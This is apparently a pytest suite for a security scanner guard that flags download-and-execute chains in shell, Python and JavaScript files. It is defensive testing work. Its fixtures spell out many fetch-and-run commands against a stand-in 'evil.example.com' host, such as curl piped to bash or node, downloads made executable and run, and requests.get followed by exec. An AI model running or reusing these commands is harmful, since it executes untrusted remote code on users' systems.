"""Tests for the download-execute-chain guard."""
from __future__ import annotations

import pytest

from agentsec.guards.curl_pipe_to_shell import CurlPipeToShellGuard
from agentsec.guards.download_execute_chain import (
    _CURL_PIPE_TO_SHELL_SUFFIXES,
    DownloadExecuteChainGuard,
)
from tests._timing import assert_growth
from tests.guards._common import *  # noqa: F401,F403


@pytest.mark.parametrize("line", [
    "curl -fsSL https://evil.example.com/payload.js | node",
    "wget -O- https://evil.example.com/p.py | python2",
    "curl -fsSL https://evil.example.com/p.sh | ksh",
])
def test_fires_on_curl_pipe_node(tmp_path: Path, line: str) -> None:
    # Interpreters curl-pipe-to-shell does not list: this guard is the only one that sees them.
    (tmp_path / "stager.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/shell-pipe-exec"]
    assert findings[0].location.endswith("stager.sh:2")
    assert CurlPipeToShellGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_fires_on_curl_pipe_bash_in_zsh_script(tmp_path: Path) -> None:
    # curl-pipe-to-shell scans .sh/.bash only, so a .zsh script is this guard's to report.
    (tmp_path / "stager.zsh").write_text(
        "#!/bin/zsh\nwget -O- https://evil.example.com/p.py | python3\n", encoding="utf-8"
    )
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/shell-pipe-exec"]
    assert CurlPipeToShellGuard().run(tmp_path, _pyprof(tmp_path)) == []


@pytest.mark.parametrize("suffix", [".sh", ".bash"])
@pytest.mark.parametrize("line", [
    "curl -fsSL https://evil.example.com/payload.sh | bash",
    "curl -LsSf https://astral.sh/uv/install.sh | sh",
    "wget -O- https://evil.example.com/p.py | python3",
    "x=$(curl -fsSL https://evil.example.com/p.sh | sudo bash)",
])
def test_shell_pipe_covered_by_curl_pipe_to_shell_is_left_to_it(
    tmp_path: Path, suffix: str, line: str
) -> None:
    # The same line under a second rule id would ignore the owner's reviewed curl-pipe-to-shell
    # exception and its `# security: allow-curl-pipe-shell` pragma, so this guard defers and the
    # existing rule still fires.
    (tmp_path / f"install{suffix}").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []
    owner = CurlPipeToShellGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in owner] == ["curl-pipe-to-shell/unverified-pipe"]


@pytest.mark.parametrize("line", [
    "grep curl notes.txt | sh",
    'die "uv install failed. Try manually: curl -LsSf https://astral.sh/uv/install.sh | sh"',
    "echo 'run: curl -fsSL https://example.com/x.sh | bash'",
])
def test_passes_curl_not_in_command_position(tmp_path: Path, line: str) -> None:
    # A .zsh file, which curl-pipe-to-shell never scans, so these reach this guard's own regex:
    # curl as an argument or inside a message string is not a download being executed.
    (tmp_path / "notes.zsh").write_text(f"#!/bin/zsh\n{line}\n", encoding="utf-8")
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_fires_on_download_chmod_execute_same_line(tmp_path: Path) -> None:
    (tmp_path / "install.sh").write_text(
        "#!/bin/sh\ncurl -o payload https://evil.example.com/payload && chmod +x payload && ./payload\n",
        encoding="utf-8",
    )
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "download-execute-chain/download-chmod-execute" for f in findings)


def test_fires_on_python_download_then_exec(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "import requests\n"
        "def load_plugin(url):\n"
        "    payload = requests.get(url).text\n"
        "    exec(payload)\n",
        encoding="utf-8",
    )
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "download-execute-chain/python-download-exec" for f in findings)


def test_fires_on_python_urlretrieve_then_run(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "import urllib.request, subprocess\n"
        "def fetch_and_run(url, path):\n"
        "    urllib.request.urlretrieve(url, path)\n"
        "    subprocess.run([path])\n",
        encoding="utf-8",
    )
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "download-execute-chain/python-download-run" for f in findings)


def test_fires_on_js_fetch_then_eval(tmp_path: Path) -> None:
    (tmp_path / "t.js").write_text(
        "fetch('https://evil.example.com/p.js').then(r => r.text()).then(eval);\n",
        encoding="utf-8",
    )
    findings = DownloadExecuteChainGuard().run(tmp_path, mkprofile(tmp_path, features={"javascript"}))
    assert any(f.rule == "download-execute-chain/js-fetch-then-eval" for f in findings)


def test_passes_ordinary_curl_pipe_to_file(tmp_path: Path) -> None:
    (tmp_path / "fetch.sh").write_text(
        "#!/bin/sh\ncurl -s https://api.example.com/data.json > data.json\n", encoding="utf-8"
    )
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_passes_download_with_no_execute(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "import requests\n"
        "def get_config(url):\n"
        "    return requests.get(url).json()\n",
        encoding="utf-8",
    )
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_passes_unrelated_download_and_exec_far_apart(tmp_path: Path) -> None:
    filler = "\n".join(f"x{i} = {i}" for i in range(40))
    (tmp_path / "t.py").write_text(
        "import requests\n"
        "def get_config(url):\n"
        "    return requests.get(url).json()\n"
        f"{filler}\n"
        "def run_trusted():\n"
        "    exec('print(1)')\n",
        encoding="utf-8",
    )
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_pragma_suppresses_whole_file(tmp_path: Path) -> None:
    (tmp_path / "stager.sh").write_text(
        "#!/bin/sh\n# security: allow-download-execute-chain\ncurl -fsSL https://evil.example.com/payload.js | node\n",
        encoding="utf-8",
    )
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_does_not_apply_with_no_relevant_stack(tmp_path: Path) -> None:
    prof = mkprofile(tmp_path, features=set())
    assert DownloadExecuteChainGuard().applies(prof) is False


def test_fires_on_multiline_fetch_then_eval_chain_at_the_fetch_line(tmp_path: Path) -> None:
    (tmp_path / "loader.js").write_text(
        "const base = 'https://evil.example.com';\n"
        "fetch(base + '/p.js')\n"
        "  .then(r => r.text())\n"
        "  .then(code => eval(code));\n",
        encoding="utf-8",
    )
    findings = DownloadExecuteChainGuard().run(tmp_path, mkprofile(tmp_path, features={"javascript"}))
    assert [f.rule for f in findings] == ["download-execute-chain/js-fetch-then-eval"]
    assert findings[0].location.endswith("loader.js:2")


@pytest.mark.parametrize("name, body", [
    # A swagger-ui / webpack-style single-line bundle: an API client's fetch and an unrelated
    # `new Function("return this")` global shim, never connected.
    ("swagger-ui-bundle.js",
     '!function(e){var t=function(u){return fetch(u,{method:"GET"})};'
     'var g=new Function("return this")();e.exports={get:t,g:g}}(module);\n'),
    # A template engine: fetches data in one function, compiles a template with eval in another.
    ("render.js",
     "export async function load(url) {\n"
     "  const res = await fetch(url);\n"
     "  return res.json();\n"
     "}\n"
     "export function compile(src) {\n"
     "  return eval('(function(ctx){return `' + src + '`})');\n"
     "}\n"),
])
def test_passes_unrelated_fetch_and_eval_in_one_file(tmp_path: Path, name: str, body: str) -> None:
    (tmp_path / name).write_text(body, encoding="utf-8")
    assert DownloadExecuteChainGuard().run(tmp_path, mkprofile(tmp_path, features={"javascript"})) == []


def test_passes_download_only_line_whose_url_ends_in_sh(tmp_path: Path) -> None:
    # Nothing is executed: `sh https://.../get.sh` inside the URL tail is not a run.
    (tmp_path / "fetch.sh").write_text(
        "#!/bin/sh\ncurl -fsSL -o /tmp/get.sh https://get.example.com/get.sh\n", encoding="utf-8"
    )
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_download_chmod_execute_reports_a_line_once(tmp_path: Path) -> None:
    (tmp_path / "install.sh").write_text(
        "#!/bin/sh\ncurl -o payload https://evil.example.com/payload && chmod +x payload && ./payload\n",
        encoding="utf-8",
    )
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]
    assert findings[0].location.endswith("install.sh:2")


def test_fires_on_download_then_chmod_execute_on_a_later_line(tmp_path: Path) -> None:
    (tmp_path / "install.sh").write_text(
        "#!/bin/sh\n"
        "curl -fsSL -o /tmp/p https://evil.example.com/p\n"
        "chmod +x /tmp/p && /tmp/p\n",
        encoding="utf-8",
    )
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]
    assert findings[0].location.endswith("install.sh:3")


@pytest.mark.parametrize("body", [
    "curl -fsSLO https://evil.example.com/stage2.sh\nsh stage2.sh\n",
    "curl -O https://evil.example.com/x.sh && chmod +x x.sh && ./x.sh\n",
])
def test_fires_on_curl_remote_name_download_then_execute(tmp_path: Path, body: str) -> None:
    # `curl -O URL` saves to the URL's basename, so that basename is the downloaded file.
    (tmp_path / "install.sh").write_text("#!/bin/sh\n" + body, encoding="utf-8")
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]


def test_passes_curl_remote_name_download_and_unrelated_script(tmp_path: Path) -> None:
    (tmp_path / "fetch.sh").write_text(
        "#!/bin/sh\ncurl -fsSLO https://get.example.com/get.sh\nsh ./unrelated.sh\n",
        encoding="utf-8",
    )
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_passes_wget_lowercase_o_log_file(tmp_path: Path) -> None:
    # wget's `-o FILE` is its LOG file, not the download target (that is `-O`).
    (tmp_path / "fetch.sh").write_text(
        "#!/bin/sh\n"
        "wget -q -o /var/log/fetch.log https://example.com/data.json\n"
        "tail /var/log/fetch.log && ./report.sh\n",
        encoding="utf-8",
    )
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []


@pytest.mark.parametrize("body", [
    # `-O -` is stdout: nothing lands on disk, so `-` must not become a "downloaded file".
    "wget -q -O - https://example.com/key.asc | gpg --dearmor > key.gpg\nchmod +x ./my-tool\n",
    "curl -fsS -o /dev/null https://example.com/health && chmod +x ./run.sh\n",
    "curl -o /dev/stdout https://example.com/x\nchmod +x ./install.sh && ./install.sh\n",
    # the target must match as a whole path token, not a substring of another name
    "curl -o out https://example.com/data\nchmod +x ./layout.sh && ./layout.sh\n",
    "curl -o out https://example.com/data\nchmod +x ./out.sh\n",
])
def test_passes_stdout_or_null_target_and_substring_names(tmp_path: Path, body: str) -> None:
    (tmp_path / "fetch.sh").write_text("#!/bin/sh\n" + body, encoding="utf-8")
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []


@pytest.mark.parametrize("body", [
    "curl -o tool https://evil.example.com/tool\nchmod +x ./tool && ./tool\n",
    "curl -o ./tool https://evil.example.com/tool\nchmod +x ./tool\n",
    "curl -o /tmp/p https://evil.example.com/p\nchmod +x /tmp/p; /tmp/p\n",
])
def test_fires_when_the_downloaded_path_is_run_as_a_whole_token(tmp_path: Path, body: str) -> None:
    (tmp_path / "fetch.sh").write_text("#!/bin/sh\n" + body, encoding="utf-8")
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]
    assert findings[0].location.endswith("fetch.sh:3")


@pytest.mark.parametrize("line", [
    "curl -fsSLo /tmp/x https://evil.example.com/x && chmod +x /tmp/x && /tmp/x",
    "wget -qO /tmp/y https://evil.example.com/y; chmod +x /tmp/y; /tmp/y",
])
def test_fires_on_combined_short_flags_ending_in_the_output_flag(tmp_path: Path, line: str) -> None:
    (tmp_path / "install.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]


def test_passes_wget_combined_lowercase_o_log_file(tmp_path: Path) -> None:
    # `-qo FILE` is wget's quiet + LOG file, not the download (that is `-O`); proven by mutation
    # (a case-insensitive wget flag pattern turns this red).
    (tmp_path / "fetch.sh").write_text(
        "#!/bin/sh\n"
        "wget -qo /var/log/fetch.log https://example.com/data.json\n"
        "tail /var/log/fetch.log && ./report.sh\n",
        encoding="utf-8",
    )
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []


@pytest.mark.parametrize("body", [
    # two curl commands on one line: the second download is the one that is run
    "curl -o /tmp/a https://h/a; curl -o /tmp/payload https://h/p\nchmod +x /tmp/payload\n",
    "curl -o a https://h/a && curl -o payload https://h/p\nchmod +x ./payload\n",
    # one curl, two -o outputs
    "curl -o /tmp/a https://h/a -o /tmp/payload https://h/p\nchmod +x /tmp/payload\n",
    # one curl, two remote-name downloads, each with its own URL
    "curl -O https://h/readme.txt -O https://h/payload\nchmod +x ./payload\n",
    # wget after a curl on the same line
    "curl -o /tmp/a https://h/a; wget -O /tmp/payload https://h/p\nchmod +x /tmp/payload\n",
])
def test_fires_on_every_download_on_a_line_not_only_the_first(tmp_path: Path, body: str) -> None:
    (tmp_path / "install.sh").write_text("#!/bin/sh\n" + body, encoding="utf-8")
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]
    assert findings[0].location.endswith("install.sh:3")


@pytest.mark.parametrize("body", [
    # tar's own `-xzO` (extract to stdout) is not a wget output flag: the wget command ends at `|`
    "wget -q https://h/x -O- | tar -xzO file\nchmod +x file\n",
    "curl -s https://h/x.tgz | tar -xzo file\nchmod +x file\n",
    "curl -fsS https://h/health && unzip -qo bundle.zip\nchmod +x bundle.zip\n",
])
def test_passes_another_commands_flag_after_curl_or_wget(tmp_path: Path, body: str) -> None:
    (tmp_path / "fetch.sh").write_text("#!/bin/sh\n" + body, encoding="utf-8")
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []


@pytest.mark.parametrize("body", [
    "curl -o /tmp/x https://h/x;chmod +x /tmp/x\n",
    "cd /tmp;curl -o x https://h/x\nchmod +x ./x\n",
    "cd /tmp && curl -sSL https://h/x -o x && chmod +x x && ./x\n",
])
def test_fires_on_downloads_in_glued_or_chained_commands(tmp_path: Path, body: str) -> None:
    (tmp_path / "install.sh").write_text("#!/bin/sh\n" + body, encoding="utf-8")
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]


@pytest.mark.parametrize("line", [
    # a separator character inside quotes, or escaped, is not a command boundary
    'curl "https://h/p?a=1&b=2" -o /tmp/x',
    "curl 'https://h/p?a=1&b=2' -fsSL -o /tmp/x",
    'curl -H "Accept: text/html; q=1" -o /tmp/x https://h/x',
    "curl -H 'X: a|b' -o /tmp/x https://h/x",
    "curl -H 'X: a&b' -o /tmp/x https://h/x",
    "curl -d 'a=1&b=2' -o /tmp/x https://h/x",
    "curl -w '%{http_code}|%{size}' -o /tmp/x https://h/x",
    "curl https://h/x?a=1\\&b=2 -o /tmp/x",
])
def test_fires_when_a_quoted_or_escaped_separator_precedes_the_output_flag(tmp_path: Path, line: str) -> None:
    (tmp_path / "install.sh").write_text(f"#!/bin/sh\n{line}\nchmod +x /tmp/x\n", encoding="utf-8")
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]
    assert findings[0].location.endswith("install.sh:3")


@pytest.mark.slow
@pytest.mark.parametrize("unit", ["'a ", '"a ', "\\\\", "'\"x ", "& ", "a\"b'c "])
def test_command_split_stays_linear_on_hostile_quotes(tmp_path: Path, unit: str) -> None:
    # Unclosed quotes, backslash runs, mixed quotes and `&` runs: the quote-aware command split
    # must stay linear. Four sizes so `classify` has three ratios (#758).
    sizes = [2000, 4000, 8000, 16000]
    roots = {}
    for n in sizes:
        root = tmp_path / f"n{n}"
        root.mkdir()
        (root / "fetch.sh").write_text(
            "#!/bin/sh\ncurl " + unit * n + "\ncurl -o /tmp/x https://h/x\nchmod +x /tmp/x\n",
            encoding="utf-8",
        )
        roots[n] = root

    found: dict[int, list[str]] = {}

    def scan(n: int) -> None:
        found[n] = [f.location for f in DownloadExecuteChainGuard().run(roots[n], _pyprof(roots[n]))]

    assert_growth(scan, sizes, expected="linear")
    assert all(len(found[n]) == 1 and found[n][0].endswith("fetch.sh:4") for n in sizes), found


@pytest.mark.parametrize("line", [
    "r=$(curl -o /tmp/x https://h/x)",
    "OUT=$(curl -fsSL -o /tmp/x https://h/x)",
    "!curl -o /tmp/x https://h/x",
    "x=`curl -o /tmp/x https://h/x`",
    "alias dl='curl -o /tmp/x https://h/x'",
    "/usr/bin/curl -o /tmp/x https://h/x",
    "echo $(curl -o /tmp/x https://h/x)",
    "sh -c 'curl -o /tmp/x https://h/x'",
])
def test_fires_on_a_prefixed_curl_command_word(tmp_path: Path, line: str) -> None:
    (tmp_path / "install.sh").write_text(f"#!/bin/sh\n{line}\nchmod +x /tmp/x\n", encoding="utf-8")
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]
    assert findings[0].location.endswith("install.sh:3")


def test_fires_on_a_payload_run_after_many_decoy_downloads(tmp_path: Path) -> None:
    # No window on how far back a download is remembered: 200 decoys between the payload and its
    # chmod must not hide it.
    decoys = "".join(f"curl -o /tmp/decoy{i} https://h/d{i}\n" for i in range(200))
    (tmp_path / "install.sh").write_text(
        "#!/bin/sh\ncurl -o /tmp/payload https://evil.example.com/p\n" + decoys + "chmod +x /tmp/payload\n",
        encoding="utf-8",
    )
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]
    assert findings[0].location.endswith("install.sh:203")


@pytest.mark.parametrize("body", [
    "curl -o a https://h/a; curl -o b https://h/b\nchmod +x ./a\n",
    "curl -o a https://h/a\ncurl -o b https://h/b\nchmod +x ./a\n",
])
def test_fires_on_an_earlier_download_not_only_the_latest(tmp_path: Path, body: str) -> None:
    (tmp_path / "install.sh").write_text("#!/bin/sh\n" + body, encoding="utf-8")
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]


def test_a_second_command_word_in_one_command_switches_the_flag_grammar(tmp_path: Path) -> None:
    # One command holding a curl and then a wget (here as quoted parallel jobs): wget's `-O FILE`
    # must be read as wget's output file, not as a curl remote-name flag.
    (tmp_path / "install.sh").write_text(
        "#!/bin/sh\n"
        'parallel ::: "curl -fsSL https://h/a" "wget -O /tmp/y https://h/y"\n'
        "chmod +x /tmp/y\n",
        encoding="utf-8",
    )
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]
    assert findings[0].location.endswith("install.sh:3")


_RELATIVE_DOWNLOAD_RUN_BY_DIRECTORY = [
    pytest.param(
        "cd /opt/app/bin && curl -fsSL https://h/tool -o tool\nchmod +x /opt/app/bin/tool\n",
        id="cd_then_absolute_chmod",
    ),
    pytest.param(
        "cd /usr/local/bin\ncurl -fsSLO https://h/tool\nsudo chmod +x /usr/local/bin/tool\n",
        id="remote_name_then_absolute_chmod",
    ),
    pytest.param(
        'cd "$DIR" && curl -fsSL https://h/tool -o tool\nchmod +x "$DIR/tool"\n',
        id="cd_var_then_var_dir_chmod",
    ),
]


@pytest.mark.parametrize("body", _RELATIVE_DOWNLOAD_RUN_BY_DIRECTORY)
def test_fires_on_a_relative_download_run_by_a_directory_qualified_path(tmp_path: Path, body: str) -> None:
    # A bare download name (no `/`) is matched by the basename of a directory-qualified run path:
    # the script cd'd into that directory first.
    (tmp_path / "install.sh").write_text("#!/bin/sh\n" + body, encoding="utf-8")
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]


def test_accepted_fp_a_bare_download_name_matches_any_directory_with_that_basename(tmp_path: Path) -> None:
    # Deliberate trade-off (PR #1048, chosen to keep the cd-then-download shapes above): without
    # tracking `cd`, a bare `-o x` also matches `bin/x`, as it did at 49f3b373. Pinned so a change
    # in either direction is a decision, not an accident.
    (tmp_path / "install.sh").write_text(
        "#!/bin/sh\ncurl -o x https://h/x\nchmod +x bin/x\n", encoding="utf-8"
    )
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]


def test_passes_command_substitution_target_and_an_unrelated_substitution_run(tmp_path: Path) -> None:
    # `-o "$(mktemp)"` and `chmod +x "$(command -v tool)"` share only the `$(` opener: splitting
    # at the paren reduced both to the key `$` and reported an unrelated run.
    (tmp_path / "install.sh").write_text(
        "#!/bin/sh\n"
        'curl -fsSL https://h/tool -o "$(mktemp)"\n'
        'chmod +x "$(command -v tool)"\n',
        encoding="utf-8",
    )
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []


@pytest.mark.parametrize("body", [
    'curl -fsSL https://h/tool -o "$(mktemp)"\nchmod +x "$(mktemp)"\n',
    'curl -fsSL https://h/tool -o "$(mktemp -d)/x"\nchmod +x "$(mktemp -d)/x"\n',
    "r=$(curl -o /tmp/x https://h/x)\n(chmod +x /tmp/x)\n",
])
def test_fires_on_command_substitution_and_parenthesised_paths(tmp_path: Path, body: str) -> None:
    (tmp_path / "install.sh").write_text("#!/bin/sh\n" + body, encoding="utf-8")
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]
    assert findings[0].location.endswith("install.sh:3")


@pytest.mark.parametrize("body", [
    pytest.param("curl -o /tmp/x https://h/x\nchmod +x /tmp/x;\n", id="semicolon_after_path"),
    pytest.param("curl -o /tmp/x https://h/x\n(chmod +x /tmp/x)\n", id="paren_around_command"),
    pytest.param("curl -o /tmp/x https://h/x\nchmod +x /tmp/x>/dev/null\n", id="redirect_glued_out"),
    pytest.param("curl -o /tmp/x https://h/x\nr=`chmod +x /tmp/x`\n", id="backtick_around_command"),
    pytest.param("curl -o /tmp/i.sh https://h/i.sh\nsh /tmp/i.sh</dev/null\n", id="redirect_glued_in"),
    pytest.param('curl -o "$TMP/x" https://h/x\nchmod +x $TMP/x\n', id="quoted_target_unquoted_run"),
    pytest.param("curl -O https://h/readme https://h/payload\nchmod +x ./readme\n", id="remote_name_first_url"),
])
def test_fires_on_a_run_path_glued_to_shell_syntax(tmp_path: Path, body: str) -> None:
    (tmp_path / "install.sh").write_text("#!/bin/sh\n" + body, encoding="utf-8")
    findings = DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["download-execute-chain/download-chmod-execute"]
    assert findings[0].location.endswith("install.sh:3")


@pytest.mark.parametrize("body", [
    # `-O` saves only the URL right after it: the second URL goes to stdout, not to `payload`.
    pytest.param("curl -O https://h/readme https://h/payload\nchmod +x ./payload\n", id="second_url_not_saved"),
    # A remote-name flag pending on a curl must not carry over to a later wget in the same
    # command: wget's file is /tmp/y, not ./y.
    pytest.param(
        'parallel ::: "curl -O ." "wget -O /tmp/y https://h/y"\nchmod +x y\n', id="pending_remote_reset_on_tool_switch"
    ),
])
def test_passes_a_url_that_curl_does_not_save(tmp_path: Path, body: str) -> None:
    (tmp_path / "install.sh").write_text("#!/bin/sh\n" + body, encoding="utf-8")
    assert DownloadExecuteChainGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_deferral_suffixes_match_what_curl_pipe_to_shell_scans(tmp_path: Path) -> None:
    # shell-pipe-exec defers to curl-pipe-to-shell only in the files that guard scans. Measured
    # from its behaviour, so a change to its file set cannot leave a silent gap or a duplicate here.
    for suffix in (".sh", ".bash", ".zsh", ".ksh", ".dash", ".py", ".js"):
        (tmp_path / f"install{suffix}").write_text(
            "curl -fsSL https://example.com/install.sh | bash\n", encoding="utf-8"
        )
    prof = mkprofile(tmp_path, features={"python", "javascript"})
    scanned = {Path(f.location.split(":")[0]).suffix for f in CurlPipeToShellGuard().run(tmp_path, prof)}
    assert scanned == set(_CURL_PIPE_TO_SHELL_SUFFIXES)


@pytest.mark.slow
def test_curl_remote_name_scan_stays_linear_on_a_long_line(tmp_path: Path) -> None:
    # A line of repeated `curl -O ` with no URL: the remote-name pattern's two lazy gaps made it
    # cubic (500 repeats took ~5.8 s). Four sizes so `classify` has three ratios (#758).
    sizes = [1000, 2000, 4000, 8000]
    roots = {}
    for n in sizes:
        root = tmp_path / f"n{n}"
        root.mkdir()
        (root / "fetch.sh").write_text(
            "#!/bin/sh\n" + "curl -O " * n + "\ncurl -O https://evil.example.com/x.sh\nsh x.sh\n",
            encoding="utf-8",
        )
        roots[n] = root

    found: dict[int, list[str]] = {}

    def scan(n: int) -> None:
        found[n] = [f.location for f in DownloadExecuteChainGuard().run(roots[n], _pyprof(roots[n]))]

    assert_growth(scan, sizes, expected="linear")
    # Still detecting at every size: a scan that stopped matching would be fast AND silent.
    assert all(len(found[n]) == 1 and found[n][0].endswith("fetch.sh:4") for n in sizes), found


@pytest.mark.slow
def test_download_then_chmod_scan_stays_linear_with_many_targets_and_chmod_lines(tmp_path: Path) -> None:
    # n downloads followed by n unrelated chmod lines: every chmod line used to be checked against
    # every registered target (T x C). Four sizes so `classify` has three ratios (#758).
    sizes = [500, 1000, 2000, 4000]
    roots = {}
    for n in sizes:
        root = tmp_path / f"n{n}"
        root.mkdir()
        (root / "fetch.sh").write_text(
            "#!/bin/sh\n"
            + "".join(f"curl -o /tmp/f{i} https://h/{i}\n" for i in range(n))
            + "chmod +x /tmp/zzz\n" * n
            + f"chmod +x /tmp/f{n - 1}\n",
            encoding="utf-8",
        )
        roots[n] = root

    found: dict[int, list[str]] = {}

    def scan(n: int) -> None:
        found[n] = [f.location for f in DownloadExecuteChainGuard().run(roots[n], _pyprof(roots[n]))]

    assert_growth(scan, sizes, expected="linear")
    # The most recent download, run on the last line, still fires at every size.
    assert all(len(found[n]) == 1 and found[n][0].endswith(f"fetch.sh:{2 * n + 2}") for n in sizes), found


# PR #1048 review rounds 2-3: the reviewer matrices (pr1048_rr2/rr3) ran ~90 curl/wget shapes
# against 49f3b373. Every shape that commit reported must still be reported, with the same rule
# set; only the four documented drops below may go silent. The known false positives it also
# reported are kept in their own list further down. A parser change that loses a shape fails here
# by name instead of surfacing in the next review round.
_FIRED_AT_49F3B373 = [
    pytest.param('.sh', 'curl -o /tmp/x https://h/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='plain'),
    pytest.param('.sh', 'curl -o /tmp/x https://h/x && chmod +x /tmp/x\n', ['download-chmod-execute'], id='sameline'),
    pytest.param('.sh', 'curl -o "/tmp/x y" "https://h/x"\nchmod +x "/tmp/x y"\n', ['download-chmod-execute'], id='quoted_space'),
    pytest.param('.sh', 'wget -qO- https://h/x | node\n', ['shell-pipe-exec'], id='wget_dash_node'),
    pytest.param('.sh', 'curl -o /tmp/x \\\n  https://h/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='cont_urlnext'),
    pytest.param('.sh', 'curl -o /tmp/a https://h/a -o /tmp/payload https://h/p\nchmod +x /tmp/payload\n', ['download-chmod-execute'], id='multi_o'),
    pytest.param('.sh', 'curl -o /tmp/a https://h/a; curl -o /tmp/payload https://h/p\nchmod +x /tmp/payload\n', ['download-chmod-execute'], id='two_curls'),
    pytest.param('.sh', 'wget -O /tmp/x https://h/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='wget_O'),
    pytest.param('.sh', 'curl -fsSLO https://h/tool\nchmod +x tool\n', ['download-chmod-execute'], id='curl_O'),
    pytest.param('.sh', 'curl -O https://h/tool\nchmod +x ./tool\n', ['download-chmod-execute'], id='curl_O_plain'),
    pytest.param('.sh', 'curl --remote-name https://h/tool?x=1\nchmod +x tool\n', ['download-chmod-execute'], id='curl_remote_name'),
    pytest.param('.sh', 'curl -o out https://h/x\nchmod +x ./out\n', ['download-chmod-execute'], id='substr_real'),
    pytest.param('.sh', 'curl -o /tmp/x;chmod +x /tmp/x\n', ['download-chmod-execute'], id='semicolon_glued'),
    pytest.param('.sh', 'curl -o "$OUT" https://h/x\nchmod +x "$OUT"\n', ['download-chmod-execute'], id='var_target'),
    pytest.param('.sh', 'curl -o /tmp/i.sh https://h/i.sh\nsh /tmp/i.sh\n', ['download-chmod-execute'], id='sh_run'),
    pytest.param('.sh', 'curl -o i.sh https://h/i.sh\nbash i.sh\n', ['download-chmod-execute'], id='bash_run_dot'),
    pytest.param('.sh', 'cd /tmp && curl -sSL https://h/x -o x && chmod +x x && ./x\n', ['download-chmod-execute'], id='cd_then'),
    pytest.param('.sh', 'sudo curl -o /usr/local/bin/t https://h/t\nsudo chmod +x /usr/local/bin/t\n', ['download-chmod-execute'], id='sudo_curl'),
    pytest.param('.sh', 'curl\t-o\t/tmp/x\thttps://h/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='tab_sep'),
    pytest.param('.sh', '/usr/bin/curl -o /tmp/x https://h/x\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='path_curl'),
    pytest.param('.sh', 'curl -o /tmp/x https://h/x 2>&1\nchmod +x /tmp/x\n', ['download-chmod-execute'], id='stderr_redir'),
